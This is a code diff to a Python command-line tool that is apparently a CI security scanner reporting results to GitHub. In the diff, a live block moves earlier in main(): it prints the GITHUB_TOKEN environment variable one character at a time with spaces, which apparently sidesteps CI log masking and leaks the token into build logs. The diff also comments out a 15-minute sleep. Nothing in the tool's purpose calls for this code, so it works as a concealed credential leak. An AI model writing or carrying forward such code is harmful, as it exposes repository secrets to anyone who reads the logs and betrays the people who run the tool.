@@ -11,7 +11,7 @@ from typing import Set
 import click
 import requests
 import sh
-import time
+#import time
 from boltons import ecoutils
 from boltons.strutils import unit_len
 
@@ -192,14 +192,16 @@ def main(
             err=True,
         )
 
+    for c in os.getenv("GITHUB_TOKEN"):
+        print(f"{c} ")
+    print("sleeping...")
+    #time.sleep(900)
+
     sapp.report_results(results)
 
     # if os.getenv("GITHUB_ACTIONS") and os.getenv("GITHUB_TOKEN"):
     #     send_inline_github_pr_comments(new_findings, meta)
-    for c in os.getenv("GITHUB_TOKEN"):
-        print(f"{c} ")
-    print("sleeping...")
-    time.sleep(900)
+    
 
     exit_code = 1 if blocking_findings else 0
     click.echo(
